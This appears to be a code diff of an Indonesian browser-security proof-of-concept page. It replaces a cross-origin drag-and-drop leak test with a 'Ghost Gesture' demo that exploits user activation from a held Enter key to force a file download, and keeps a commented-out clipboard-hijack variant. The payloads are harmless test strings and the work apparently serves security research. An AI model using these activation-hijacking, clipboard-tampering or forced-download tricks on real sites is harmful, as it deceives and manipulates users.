@@ -1,80 +1,97 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <title>Situs B - Target Korban</title>
+    <title>PoC - Site B (Clipboard)</title>
     <style>
         body {
-            background-color: #ffebee;
-            font-family: sans-serif;
-            padding: 50px;
-            text-align: center;
-        }
-
-        #dropZone {
-            border: 4px dashed #d32f2f;
-            padding: 80px 20px;
-            background: white;
-            margin-top: 30px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #d32f2f;
-        }
-
-        #log {
-            margin-top: 20px;
-            text-align: left;
-            background: #222;
-            color: #0f0;
-            padding: 15px;
             font-family: monospace;
-            min-height: 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: white;
+        }
+
+        #timer {
+            font-size: 3rem;
+            font-weight: bold;
+        }
+
+        #status {
+            margin-top: 20px;
+            color: #666;
+            font-weight: bold;
         }
     </style>
 </head>
 
 <body>
-    <h2>Situs B (Domain Berbeda - Tanpa Sandbox)</h2>
-    <p>Ini adalah halaman web normal yang memiliki izin penuh.</p>
 
-    <div id="dropZone">
-        JATUHKAN KOTAK BIRU DARI SITUS A KE SINI
-    </div>
+    <div id="timer">2s...</div>
+    <div id="status">Tahan terus sampai 1s</div>
 
-    <div id="log">Menunggu aktivitas drop...<br></div>
+    <!-- <script>
+        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
+        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
 
+        window.addEventListener('keyup', async (e) => {
+            if (e.key === 'Enter') {
+                const status = document.getElementById('status');
+
+                if (navigator.userActivation.isActive) {
+                    try {
+                        await navigator.clipboard.writeText("POC - UTAA");
+                        status.innerText = "RESULT: SUCCESS (Clipboard Hijacked!)";
+                        status.style.color = "green";
+                        console.log("Ghost Gesture Success: Clipboard modified.");
+                    } catch (err) {
+                        status.innerText = "RESULT: FAILED (Blocked by Permission Policy)";
+                        status.style.color = "red";
+                        console.error(err);
+                    }
+                } else {
+                    status.innerText = "RESULT: EXPIRED (User Activation was reset)";
+                    status.style.color = "blue";
+                }
+            }
+        });
+    </script> -->
     <script>
-        const dropZone = document.getElementById('dropZone');
-        const logDiv = document.getElementById('log');
+        setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
+        setTimeout(() => { document.getElementById('timer').innerText = "LEPAS!"; }, 2000);
 
-        function log(msg) {
-            logDiv.innerHTML += msg + "<br>";
-            console.log(msg);
-        }
+        window.addEventListener('keyup', async (e) => {
+            if (e.key === 'Enter') {
+                const status = document.getElementById('status');
+                if (navigator.userActivation.isActive) {
+                    try {
+                        const content = "Ini adalah file hasil ujicoba Sandbox Bypass.";
+                        const blob = new Blob([content], { type: 'text/plain' });
+                        const url = window.URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.style.display = 'none';
+                        a.href = url;
+                        a.download = 'poc_download.txt'; // Nama file
+                        document.body.appendChild(a);
+                        a.click();
+                        window.URL.revokeObjectURL(url);
+                        document.body.removeChild(a);
 
-        dropZone.addEventListener('dragover', (e) => {
-            e.preventDefault();
-            dropZone.style.backgroundColor = "#ffcdd2";
-        });
-
-        dropZone.addEventListener('dragleave', () => {
-            dropZone.style.backgroundColor = "white";
-        });
-
-        dropZone.addEventListener('drop', (e) => {
-            e.preventDefault();
-            dropZone.style.backgroundColor = "white";
-            log("--- DROP TERDETEKSI DARI LUAR ---");
-            const leakedText = e.dataTransfer.getData("text/plain");
-            const leakedDownload = e.dataTransfer.getData("DownloadURL");
-
-            if (leakedDownload) {
-                log("<span style='color:red'>BAHAYA (SOP BYPASS)! Situs B berhasil membaca DownloadURL:</span> " + leakedDownload);
-            } else if (leakedText) {
-                log("<span style='color:red'>BAHAYA (SOP BYPASS)! Situs B berhasil membaca teks:</span> " + leakedText);
-            } else {
-                log("Aman. Browser memblokir pembacaan data lintas-origin.");
+                        status.innerText = "RESULT: SUCCESS (Download Triggered!)";
+                        status.style.color = "green";
+                        console.log("Ghost Gesture Success: Download initiated.");
+                    } catch (err) {
+                        status.innerText = "RESULT: FAILED (Blocked by Sandbox/Policy)";
+                        status.style.color = "red";
+                        console.error(err);
+                    }
+                } else {
+                    status.innerText = "RESULT: EXPIRED (User Activation was reset)";
+                    status.style.color = "blue";
+                }
             }
         });
     </script>
